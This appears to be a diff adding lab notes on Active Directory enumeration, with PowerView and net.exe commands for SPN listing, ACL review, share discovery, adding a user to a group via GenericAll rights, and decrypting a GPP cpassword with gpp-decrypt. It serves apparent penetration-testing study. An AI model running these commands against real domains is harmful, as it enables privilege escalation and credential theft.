@@ -2066,5 +2066,120 @@ PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
 
 
 
+### Enumeration Through Service Principal Names
 
+#### Listing SPN linked to a certain user account
+
+~~~ powershell
+PS C:\Tools>  setspn -L iis_service
+~~~
+
+#### Listing the SPN accounts in the domain
+
+~~~ powershell
+PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
+~~~
+
+#### Resolving the domain name
+
+~~~ powershell
+PS C:\Tools> nslookup.exe web04.corp.com
+~~~
+
+### Enumerating Object Permissions
+
+#### Running Get-ObjectAcl specifying our user
+
+~~~ powershell
+PS C:\Tools> Get-ObjectAcl -Identity stephanie
+~~~
+
+
+#### Converting the ObjectISD into name
+
+~~~ powershell
+PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+CORP\stephanie
+~~~
+
+#### Converting the SecurityIdentifier into name
+
+~~~ powershell
+PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+CORP\RAS and IAS Servers
+~~~
+
+
+#### Enumerating ACLs for the Management Group
+
+~~~ powershell
+PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+~~~
+
+
+
+#### Converting all SIDs that have GenericAll permission on the Management Group
+
+~~~ powershell
+PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+CORP\Domain Admins
+CORP\stephanie
+BUILTIN\Account Operators
+Local System
+CORP\Enterprise Admins
+~~~
+
+
+#### Using "net.exe" to add ourselves to domain group
+
+~~~ powershell
+PS C:\Tools> net group "Management Department" stephanie /add /domain
+The request will be processed at a domain controller for domain corp.com.
+
+The command completed successfully.
+~~~
+
+
+#### Running "Get-NetGroup" to enumerate "Management Department"
+
+~~~ powershell
+PS C:\Tools> Get-NetGroup "Management Department" | select member
+
+member
+------
+{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
+~~~
+
+
+#### Using "net.exe" to remove ourselves from domain group
+
+~~~ powershell
+PS C:\Tools> net group "Management Department" stephanie /del /domain
+The request will be processed at a domain controller for domain corp.com.
+
+The command completed successfully.
+~~~
+
+### Enumerating Domain Shares
+
+#### Domain Share Query
+
+~~~ powershell
+PS C:\Tools> Find-DomainShare -CheckShareAccess
+~~~
+
+
+#### Listing contents of the SYSVOL share
+
+~~~ powershell
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+~~~
+
+
+#### Using gpp-decrypt to decrypt the password
+
+~~~ powershell
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+~~~
 
